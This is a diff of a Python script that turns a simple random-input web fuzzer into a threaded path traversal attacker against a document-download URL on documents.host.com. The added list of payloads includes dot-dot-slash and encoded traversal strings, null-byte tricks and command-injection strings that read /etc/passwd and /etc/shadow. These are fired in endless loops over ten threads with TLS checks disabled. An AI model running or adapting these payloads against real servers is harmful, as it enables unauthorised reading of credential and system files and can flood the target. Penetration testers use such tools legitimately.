@@ -1,99 +1,144 @@
 import asyncio
-import threading
-import random  # Using built-in random module
-from pwn import log
 import aiohttp
-import shlex
-from urllib.parse import quote
+import random
+import string
+import threading
+import re
 
-# Define the character sets to use for fuzzing
+# Your curl command with payload placeholder (marked with @@ for fuzzing)
+curl_command = "curl --path-as-is -i -s -k -X $'GET' \
+    -H $'Host: documents.host.com' -H $'Sec-Ch-Ua: \"Chromium\";v=\"129\", \"Not=A?Brand\";v=\"8\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: de-DE,de;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6677.71 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate, br' -H $'If-Modified-Since: Thu, 17 Oct 2024 08:42:01 GMT' -H $'Priority: u=0, i' -H $'Connection: keep-alive' \
+    $'https://documents.host.com/id/@@_de_20221114-112935_ch.pdf'"
+
+proxy_url = "http://127.0.0.1:8080"
+custom_ssl_cert_path = None  # Set to your custom SSL certificate path if needed
+
+# Parse the cURL command to extract method, headers, and URL
+def parse_curl_command(command):
+    method = re.search(r"-X \$'(\w+)'", command).group(1)
+    url = re.search(r"\$'(https?://[^\s]+)'", command).group(1)
+    headers = dict(re.findall(r"-H \$'([^:]+):\s?([^']+)'", command))
+    return method, url, headers
+
+method, url, headers = parse_curl_command(curl_command)
+
+# Fuzzing modes
+FUZZ_MODE_RANDOM = "random"
+FUZZ_MODE_TRAVERSAL = "traversal"
+fuzz_mode = FUZZ_MODE_TRAVERSAL  # Set the fuzzing mode here
+
+# Define the character sets to use for fuzzing (for random input)
 charsets = {
-    'alpha': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
-    'numeric': '0123456789',
-    'alphanumeric': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
-    'special': '!@#$%^&*()-_=+[]{}|;:,.<>?/`~'
+    'alpha': string.ascii_letters,
+    'numeric': string.digits,
+    'alphanumeric': string.ascii_letters + string.digits,
+    'special': string.punctuation
 }
 
-# Define the range of lengths to use for fuzzing
+# Path traversal payloads for fuzzing
+path_traversal_payloads = [
+    "../../",
+    "../../../",
+    "/../../../^^",
+    "/../../",
+    "/././././",
+    "/./././././",
+    "\\..\\..\\..\\",
+    "..\\..\\..\\..\\",
+    "/..\\/..\\/..\\/",
+    ".\\/./.\\/./",
+    "\\..\\..\\",
+    "..\\..\\",
+    "/%2e%2e%2",
+    "/%2e%2e%2",
+    "%0a/bin/",
+    "%00/etc/",
+    "%00../../",
+    "/..%c0%af../..%c0%af../",
+    "/%2e%2e/%2e%2e/%2e%2e/",
+    "%25%5c..%25%5c..%25%5c..%25%5c",
+    "/%25%5c..%25%5c..%25%5c..%25%5c",
+    "\\'/bin/cat /etc/passwd\\'",
+    "\\'/bin/cat /etc/shadow\\'",
+    "C:/inetpub/wwwroot/",
+    "C:\\inetpub\\wwwroot\\",
+    "C:/",
+    "C:\\",
+    "/../../../",
+    "/..\\../..\\../..\\../",
+    "/.\\/./.\\/./.\\/",
+    "/.../.../",
+    "..%c0%af../..%c0%af../",
+    "/%2e%2e/%2e%2e/%2e%2e/",
+    "Ã°ÂÂÂ¨Ã°ÂÂÂ»Ã¢ÂÂÃ°ÂÂÂ",
+    "lð¨ð»âð",
+    "Ã¢ÂÂ",
+    "/../œ∑´®†¥¨ˆøπ“‘",
+    "👨🏻‍🚀",
+]
+
 min_length = 1
 max_length = 20
+num_threads = 10
 
-# Define the number of requests to send per thread
-num_requests = 3
+# Function to handle errors and keep shooting
+async def make_request(session, url, method, headers, data, proxy_url):
+    try:
+        async with session.request(method, url, headers=headers, data=data, proxy=proxy_url) as response:
+            print(f"[*] URL: {url} | Status: {response.status}")
+    except aiohttp.ClientConnectionError as e:
+        print(f"[!] Connection error: {e}")
+    except aiohttp.ClientConnectorError as e:
+        print(f"[!] Connector error: {e}")
+    except aiohttp.ClientPayloadError as e:
+        print(f"[!] Payload error: {e}")
+    except aiohttp.ClientError as e:
+        print(f"[!] Unexpected error: {e}")
+    except Exception as e:
+        print(f"[!] General error: {e}")
 
-# Manual CURL parsing function
-def parse_curl_command(curl_command):
-    curl_command = curl_command.replace('@@', '{}')  # Placeholder for payload injection
-    parts = shlex.split(curl_command)
-    headers = {}
-    data = None
-    method = 'GET'
-    url = None
+# Generate and make requests continuously, fuzzing payload positions
+async def generate_and_make_requests(session, url, method, headers, data, proxy_url, fuzz_mode):
+    while True:
+        if fuzz_mode == FUZZ_MODE_RANDOM:
+            # Generate random payload
+            length = random.randint(min_length, max_length)
+            charset = random.choice(list(charsets.keys()))
+            payload = ''.join(random.choice(charsets[charset]) for _ in range(length))
+        elif fuzz_mode == FUZZ_MODE_TRAVERSAL:
+            # Use path traversal payloads
+            payload = random.choice(path_traversal_payloads)
 
-    for i in range(len(parts)):
-        if parts[i] == 'curl':
-            continue
-        elif parts[i] == '-X':
-            method = parts[i + 1].upper()
-        elif parts[i] == '-H':
-            header = parts[i + 1].split(':', 1)
-            headers[header[0].strip()] = header[1].strip()
-        elif parts[i] in ['--data', '--data-raw', '--data-binary']:
-            data = parts[i + 1]
-            method = 'POST'  # Typically, data in CURL implies a POST request
-        elif not parts[i].startswith('-'):
-            url = parts[i]
+        # Fuzz the URL and headers by replacing the placeholder @@ with the generated payload
+        fuzzed_url = url.replace('@@', payload)
+        fuzzed_headers = {key: value.replace('@@', payload) for key, value in headers.items()}
 
-    return url, method, headers, data
+        print(f"[*] Generated payload: {payload}")
+        print(f"[*] Making request to: {fuzzed_url}")
 
-# Define the filter function to use
-def filter_response(response):
-    return response.status != 404  # Example filter logic
+        await make_request(session, fuzzed_url, method, fuzzed_headers, data, proxy_url)
 
-# Define the coroutine to make requests
-async def make_request(session, url, method, headers, data, payload):
-    # URL encode the payload to ensure that special characters are handled correctly
-    encoded_payload = quote(payload)
-    target_url = url.replace('@@', encoded_payload)  # Direct replacement of the payload
+async def run():
+    ssl_context = False  # Disable SSL verification by default
+    if custom_ssl_cert_path:
+        ssl_context = aiohttp.ClientSSLContext()
+        ssl_context.load_verify_locations(custom_ssl_cert_path)
 
-    async with session.request(method, target_url, headers=headers, data=data) as response:
-        if filter_response(response):
-            log.info(f"URL: {target_url} | Status: {response.status}")
-            with open('filtered_responses.txt', 'a') as f:
-                f.write(f'{target_url}\n{await response.text()}\n\n')
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
+        tasks = []
+        for _ in range(num_threads):
+            task = generate_and_make_requests(session, url, method, headers, None, proxy_url, fuzz_mode)
+            tasks.append(task)
+        await asyncio.gather(*tasks)
 
-# Generate and make requests with fuzzing payloads
-async def generate_and_make_requests(session, url, method, headers, data):
-    for _ in range(num_requests):
-        # Generate a random payload using built-in random module
-        charset = random.choice(list(charsets.keys()))
-        payload = ''.join(random.choice(charsets[charset]) for _ in range(random.randint(min_length, max_length)))
-        log.info(f"Generated payload: {payload}")
-        await make_request(session, url, method, headers, data, payload)
-
-# Wrapper to handle asyncio event loop for each thread
-def thread_worker(curl_command):
-    url, method, headers, data = parse_curl_command(curl_command)
-    async def run():
-        async with aiohttp.ClientSession() as session:
-            await generate_and_make_requests(session, url, method, headers, data)
+def thread_worker():
     asyncio.run(run())
 
-# Function to start the fuzzing with multiple threads
-def start_fuzzer(curl_command, num_threads=10):
-    threads = []
-    for _ in range(num_threads):
-        thread = threading.Thread(target=thread_worker, args=(curl_command,))
-        thread.start()
-        threads.append(thread)
+threads = []
+for _ in range(num_threads):
+    thread = threading.Thread(target=thread_worker)
+    thread.start()
+    threads.append(thread)
 
-    for thread in threads:
-        thread.join()
-
-# Example CURL command with @@ as a placeholder
-curl_command = "curl --path-as-is -i -s -k -X $'POST' \
-    -H $'Host: thing.com' -H $'Content-Length: 0' -H $'Referer: @@' -H $'Content-Type: application/json' -H $'Accept: */*' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
-    $'https://thang.com/api/device/initAuthentication'"
-
-# Start the fuzzer
-start_fuzzer(curl_command, num_threads=10)
+for thread in threads:
+    thread.join()
